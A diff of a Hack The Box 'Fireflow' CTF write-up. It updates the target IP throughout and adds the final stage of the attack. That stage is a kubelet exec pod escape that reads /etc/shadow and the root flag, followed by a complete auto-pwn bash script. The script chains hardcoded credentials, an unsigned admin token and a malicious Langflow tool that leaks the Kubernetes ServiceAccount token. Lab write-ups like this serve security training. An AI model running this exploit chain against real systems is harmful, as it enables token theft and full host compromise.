@@ -8,8 +8,8 @@ Today we'll do the [Fireflow](https://app.hackthebox.com/machines/Fireflow) HTB'
 First of all we need to add the register to `/etc/hosts`:
 
 ```
-$ echo "10.129.95.159 fireflow.htb" | sudo tee -a /etc/hosts
-10.129.95.159 fireflow.htb
+$ echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
+10.129.244.214 fireflow.htb
 $
 ```
 
@@ -24,7 +24,7 @@ You can use any port scanner, like [Rustscan](https://github.com/bee-san/RustSca
 First, let's run it and then use Nmap to run default scripts (`-A`, naabu are currently implementing services and versions detection, so if you're reading this, you should check the repository for more information)
 
 ```
-[3,979s][~] ᛋᛋ naabu -host 10.129.95.159 -p -                
+[3,979s][~] ᛋᛋ naabu -host 10.129.244.214 -p -                
 
                   __
   ___  ___  ___ _/ /  __ __
@@ -36,17 +36,17 @@ First, let's run it and then use Nmap to run default scripts (`-A`, naabu are cu
 [INF] Current naabu version 2.6.1 (latest)
 [WRN] UI Dashboard is disabled, Use -dashboard option to enable
 [INF] Running CONNECT scan with non root privileges
-10.129.95.159:22
-10.129.95.159:443
-[INF] Found 2 ports on host 10.129.95.159 (10.129.244.214)
+10.129.244.214:22
+10.129.244.214:443
+[INF] Found 2 ports on host 10.129.244.214 (10.129.244.214)
 ```
 
 Alright, now we can use the nmap default scripts to get banners and others
 
 ```
-[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.95.159 -p22,443,65535 -T5
+[2m14,942s][~] ᛋᛋ sudo nmap -A 10.129.244.214 -p22,443,65535 -T5
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 16:40 -0300
-Nmap scan report for fireflow.htb (110.129.95.159)
+Nmap scan report for fireflow.htb (110.129.244.214)
 Host is up (0.17s latency).
 
 PORT      STATE  SERVICE  VERSION
@@ -76,7 +76,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   222.76 ms 10.10.14.1
-2   222.83 ms fireflow.htb (10.129.95.159)
+2   222.83 ms fireflow.htb (10.129.244.214)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
@@ -166,8 +166,8 @@ flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duratio
 So we find the flow subdomain, let's add it to our `/etc/hosts`
 
 ```
-[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.95.159 flow.fireflow.htb" | sudo tee -a /etc/hosts
-10.129.95.159 flow.fireflow.htb
+[14ms][~/Hacking/CTFs/Fireflow] ᛋᛋ echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
+10.129.244.214 flow.fireflow.htb
 [1,463s][~/Hacking/CTFs/Fireflow] ᛋᛋ 
 ```
 
@@ -190,7 +190,7 @@ We discovered a valid subdomain, so we can suppose that some services may respon
 [INF] Running CONNECT scan with non root privileges
 flow.fireflow.htb:22
 flow.fireflow.htb:443
-[INF] Found 2 ports on host flow.fireflow.htb (10.129.95.159)
+[INF] Found 2 ports on host flow.fireflow.htb (10.129.244.214)
 [2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ
 ```
 
@@ -199,9 +199,9 @@ Same ports open, let's check if something changed in nmap default scripts
 ```
 [2m15,336s][~/Hacking/CTFs/Fireflow] ᛋᛋ sudo nmap -A flow.fireflow.htb -p22,443,65535 -T5
 Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-19 16:34 -0300
-Nmap scan report for flow.fireflow.htb (10.129.95.159)
+Nmap scan report for flow.fireflow.htb (10.129.244.214)
 Host is up (0.15s latency).
-rDNS record for 10.129.95.159: fireflow.htb
+rDNS record for 10.129.244.214: fireflow.htb
 
 PORT      STATE  SERVICE   VERSION
 22/tcp    open   ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
@@ -231,7 +231,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE (using port 65535/tcp)
 HOP RTT       ADDRESS
 1   147.17 ms 10.10.14.1
-2   147.47 ms fireflow.htb (10.129.95.159)
+2   147.47 ms fireflow.htb (10.129.244.214)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds
@@ -1351,7 +1351,7 @@ So let's run it:
 and (🥁🥁🥁):
 
 ```
-[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.95.159 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
+[+] [New Reverse Shell] => mcp-server-54464cb475-29ztf 10.129.244.214 Linux-x86_64 👤 mcp(1000) 😍️ Session ID <2>
 (Penelope)─(Session [1])> 
 ```
 
@@ -1556,7 +1556,7 @@ mcp@mcp-server-54464cb475-29ztf:/app$ curl --cacert "$CA" \
   "serverAddressByClientCIDRs": [
     {
       "clientCIDR": "0.0.0.0/0",
-      "serverAddress": "10.129.95.159:6443"
+      "serverAddress": "10.129.244.214:6443"
     }
   ]
 }
@@ -1991,7 +1991,7 @@ mcp@mcp-server-54464cb475-29ztf:~$ curl --cacert "$CA" \\
   "serverAddressByClientCIDRs": [
     {
       "clientCIDR": "0.0.0.0/0",
-      "serverAddress": "10.129.95.159:6443"
+      "serverAddress": "10.129.244.214:6443"
     }
   ]
 }
@@ -2318,7 +2318,7 @@ fi
 I needed a `NODE_IP` environment variable (which is probably the host IP), so I set it:
 
 ```
-mcp@mcp-server-54464cb475-29ztf:/tmp$ export NODE_IP="10.129.95.159"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export NODE_IP="10.129.244.214"
 mcp@mcp-server-54464cb475-29ztf:/tmp$ 
 ```
 
@@ -2327,7 +2327,7 @@ After this I just executed the file:
 ```
 mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
 
-[+] Target: 10.129.95.159:10250
+[+] Target: 10.129.244.214:10250
 [+] Pod: default/nginx
 
 [~>] Fetching hostname...
@@ -2456,6 +2456,8 @@ HTTP 200
 mcp@mcp-server-54464cb475-29ztf:/tmp$ 
 ```
 
+## Compromising `prometheus-prometheus-node-exporter` for Root Escaped Shell
+
 Apparently the `prometheus-prometheus-node-exporter` pod runs directly into system, mounted at host's filesystem (it's already using the `HOST_IP`, so why not?!). I'll just set the `POD` environment variable so the `escape.sh` will correcly run the PoC against it:
 
 ```
@@ -2464,7 +2466,7 @@ mcp@mcp-server-54464cb475-29ztf:/tmp$ echo $POD
 prometheus-prometheus-node-exporter-nmntq
 mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
 
-[+] Target: 10.129.95.159:10250
+[+] Target: 10.129.244.214:10250
 [+] Pod: default/prometheus-prometheus-node-exporter-nmntq
 
 [~>] Fetching hostname...
@@ -2623,6 +2625,246 @@ else
 fi
 ```
 
+And I ran it again:
 
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
+
+[+] Target: 10.129.244.214:10250
+[+] Pod: default/prometheus-prometheus-node-exporter-nmntq
+
+[~>] Fetching hostname...
+[!] WebSocket error: server rejected WebSocket connection: HTTP 404
+[!] Could not fetch hostname
+
+[~>] Fetching identity...
+[!] WebSocket error: server rejected WebSocket connection: HTTP 404
+[!] Could not fetch identity
+
+[~>] Attempting to read /etc/shadow...
+[!] WebSocket error: server rejected WebSocket connection: HTTP 404
+[!] Could not read /etc/shadow
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+Reading the code, I noticed that we may change the `CONTAINER` and `NAMESPACE` environment variables too, as we aren't running this against ngnix and the pod is in the `monitoring` , so I set it:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export NAMESPACE="monitoring"
+mcp@mcp-server-54464cb475-29ztf:/tmp$ export CONTAINER=node-exporter
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+And then I ran it again:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ ./escape.sh 
+
+[+] Target: 10.129.244.214:10250
+[+] Pod: monitoring/prometheus-prometheus-node-exporter-nmntq
+
+[~>] Fetching hostname...
+[+] Hostname: fireflow
+
+[~>] Fetching identity...
+[+] Identity: uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
+
+[~>] Attempting to read /etc/shadow...
+[+] Successfully read /etc/shadow:
+root:*:::::::
+daemon:*:::::::
+bin:*:::::::
+sys:*:::::::
+sync:*:::::::
+mail:*:::::::
+www-data:*:::::::
+operator:*:::::::
+nobody:*:::::::
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+Success! Now I just need to source the exploit (to get the function `exec_cmd` in my shell) and freely get the flag:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ source escape.sh 
+
+[+] Target: 10.129.244.214:10250
+[+] Pod: monitoring/prometheus-prometheus-node-exporter-nmntq
+
+[~>] Fetching hostname...
+[+] Hostname: fireflow
+
+[~>] Fetching identity...
+[+] Identity: uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
+
+[~>] Attempting to read /etc/shadow...
+[+] Successfully read /etc/shadow:
+root:*:::::::
+daemon:*:::::::
+bin:*:::::::
+sys:*:::::::
+sync:*:::::::
+mail:*:::::::
+www-data:*:::::::
+operator:*:::::::
+nobody:*:::::::
+mcp@mcp-server-54464cb475-29ztf:/tmp$ exec_cmd "ls"
+bin
+dev
+etc
+home
+host
+lib
+proc
+root
+sys
+tmp
+usr
+var
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+And now I get into `host` directory (mounted at host's filesystem) and them get my flag:
+
+```
+mcp@mcp-server-54464cb475-29ztf:/tmp$ exec_cmd "ls /host"
+proc
+root
+sys
+mcp@mcp-server-54464cb475-29ztf:/tmp$ exec_cmd "ls /host/root"
+bin
+bin.usr-is-merged
+boot
+cdrom
+dev
+etc
+home
+lib
+lib.usr-is-merged
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+sbin.usr-is-merged
+snap
+srv
+sys
+tmp
+usr
+var
+mcp@mcp-server-54464cb475-29ztf:/tmp$ exec_cmd "ls /host/root/root"
+root.txt
+update_mcp_ip.sh
+mcp@mcp-server-54464cb475-29ztf:/tmp$ exec_cmd "cat /host/root/root/root.txt"
+[removed :p]
+mcp@mcp-server-54464cb475-29ztf:/tmp$ 
+```
+
+# Hey, I just want the flags, manual hacking sucks
+
+```sh
+#!/bin/bash
+printf CiAgICAgICAgIF9ubm5uXyAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICBkR0dHR01NYiAgICAgLCIiIiIiIiIiIiIiIiIiLgogICAgICAgQHB+cXB+fnFNYiAgICB8IGhvV28gMTMzNyAhISB8CiAgICAgICBNfEB8fEApIE18ICAgXzsuLi4uLi4uLi4uLi4uLicKICAgICAgIEAsLS0tLS5KTXwgLScKICAgICAgSlNeXF9fLyAgcUtMCiAgICAgZFpQICAgICAgICBxS1JiCiAgICBkWlAgICAgICAgICAgcUtLYgogICBmWlAgICAgICAgICAgICBTTU1iCiAgIEhaTSAgICAgICAgICAgIE1NTU0KICAgRnFNICAgICAgICAgICAgTU1NTQogX198ICIuICAgICAgICB8XGRTInFNTAogfCAgICBgLiAgICAgICB8IGAnIFxacQpfKSAgICAgIFwuX19fLix8ICAgICAuJwpcX19fXyAgIClNTU1NTU18ICAgLicKICAgICBgLScgICAgICAgYC0tJyBoam0KCkZpcmVmbG93IEF1dG9QV04gMTMzNyAhISEK | base64 -d
+
+echo -e "\n\n[!] Startig Script"
+
+if [[ $# -lt 1 ]]; then
+  echo "[*] Error: Missing arguments."
+  echo "[?] Usage: $0 <fireflow_ip>"
+  exit 1
+fi
+
+echo -e "\n[?] Obtaining user flag for user nightfall"
+
+FIREFLOW_IP="$1"
+USER_PASS="n1ghtm4r3_b4_n1ghtf4ll"
+
+echo "[?] Connecting through ssh"
+UFLAG=$(sshpass -p "$USER_PASS" ssh -o StrictHostKeyChecking=no "nightfall@$FIREFLOW_IP" "cat /home/nightfall/user.txt")
+
+echo "[+] User Flag Obtained: $UFLAG"
+
+echo -e "\n[?] Obtaining root flag via Langflow RCE -> kubelet exec escape"
+echo "[?] Deps needed on this box: python3, httpx, websockets, sshpass"
+
+LANGFLOW_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ."
+LOCAL_PORT=51337
+MCP_URL="http://localhost:${LOCAL_PORT}"
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+MCP_CLI="$SCRIPT_DIR/MCP-cli/mcp-cli.py"
+ESCAPE_SH="$SCRIPT_DIR/escape.sh"
+
+echo "[?] Opening SSH port-forwards (Langflow 30080 + kubelet 10250)"
+sshpass -p "$USER_PASS" ssh -N \
+  -L "${LOCAL_PORT}:127.0.0.1:30080" \
+  -L "10250:127.0.0.1:10250" \
+  -o StrictHostKeyChecking=no "nightfall@$FIREFLOW_IP" &
+TUNNEL_PID=$!
+trap 'kill "$TUNNEL_PID" 2>/dev/null' EXIT
+sleep 3
+
+echo "[?] Uploading malicious Langflow tool (leaks k8s ServiceAccount token)"
+curl -s -X POST "$MCP_URL/api/v1/tools" \
+  -H 'accept: application/json' \
+  -H "Authorization: Bearer $LANGFLOW_TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "name": "getsatoken",
+    "description": "leak sa token",
+    "properties": {},
+    "code": "print(open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read())"
+  }' > /dev/null
+
+echo "[?] Calling tool through MCP to leak the ServiceAccount token"
+TOOL_OUTPUT=$(python3 "$MCP_CLI" --url "$MCP_URL/mcp" call getsatoken --args '{}' | tail -n +2)
+K8S_TOKEN=$(echo "$TOOL_OUTPUT" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["result"]["content"][0]["text"].strip())')
+
+if [[ -z "$K8S_TOKEN" ]]; then
+  echo "[*] Error: Could not leak k8s ServiceAccount token."
+  exit 1
+fi
+
+echo "[+] Leaked ServiceAccount Token obtained"
+
+echo -e "\n[?] Escaping pod via kubelet exec API (node-exporter mounts /host)"
+
+python3 -c "import websockets" 2>/dev/null || {
+  echo "[?] Installing missing python module: websockets"
+  pip install --quiet --break-system-packages websockets 2>/dev/null || pip install --quiet --user websockets
+}
+
+EXEC_CMD_FN=$(sed -n '/^exec_cmd() {/,/^}/p' "$ESCAPE_SH")
+eval "$EXEC_CMD_FN"
+
+NODE_IP="127.0.0.1"
+TOKEN="$K8S_TOKEN"
+NAMESPACE="monitoring"
+POD="prometheus-prometheus-node-exporter-nmntq"
+CONTAINER="node-exporter"
+
+RFLAG=$(exec_cmd "cat /host/root/root/root.txt" | tr -d '\r')
+
+echo "[?] Closing SSH port-forwards"
+kill "$TUNNEL_PID" 2>/dev/null
+trap - EXIT
+
+if [[ -z "$RFLAG" ]]; then
+  echo "[*] Error: Could not read root flag."
+  exit 1
+fi
+
+echo "[+] Root Flag Obtained: $RFLAG"
+
+echo -e "\n[!] Summary"
+echo "    User Flag: $UFLAG"
+echo "    Root Flag: $RFLAG"
+```
+
+This needs `websockets` python package to be installed.
 
 ---
